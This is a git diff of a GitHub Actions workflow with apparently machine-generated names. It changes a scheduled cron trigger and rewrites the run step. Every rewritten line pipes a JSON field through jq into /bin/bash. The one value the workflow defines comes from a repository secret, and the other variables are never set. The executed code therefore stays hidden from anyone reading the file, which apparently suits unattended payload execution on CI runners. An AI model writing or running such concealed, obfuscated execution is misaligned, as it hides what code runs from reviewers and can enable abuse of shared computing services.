@@ -3,7 +3,8 @@ name: longzhitao3817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
+    - cron: '55 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: longzhitao3817
         env:
-          kwfug697: ${{ secrets.kwfug697 }}
+          ldpn5086: ${{ secrets.ldpn5086 }}
         run: |
-          echo $kwfug697 | jq -r .egt96511 | /bin/bash
-          echo $szae45 | jq -r .leol2 | /bin/bash
-          echo $bbxe0490 | jq -r .fec9015 | /bin/bash
-          echo $fun910 | jq -r .rfl6 | /bin/bash
-          echo $jz68161 | jq -r .opce67207 | /bin/bash
-          echo $o658 | jq -r .xuwpl72190 | /bin/bash
-          echo $wa8915 | jq -r .sticu5035 | /bin/bash
-          echo $hd97 | jq -r .kkkfe67 | /bin/bash
-          echo $aa5 | jq -r .y76 | /bin/bash
-          echo $j16753 | jq -r .jca36 | /bin/bash
-          echo $nwnrh538 | jq -r .q89 | /bin/bash
+          echo $ldpn5086 | jq -r .mce8411 | /bin/bash
+          echo $bqg741 | jq -r .j7501 | /bin/bash
+          echo $desrv8212 | jq -r .z40283 | /bin/bash
+          echo $asb060 | jq -r .vmmyu110 | /bin/bash
+          echo $grx28 | jq -r .uo25 | /bin/bash
+          echo $cdoq98796 | jq -r .jser516 | /bin/bash
+          echo $otcmy104 | jq -r .wbaew4 | /bin/bash
 
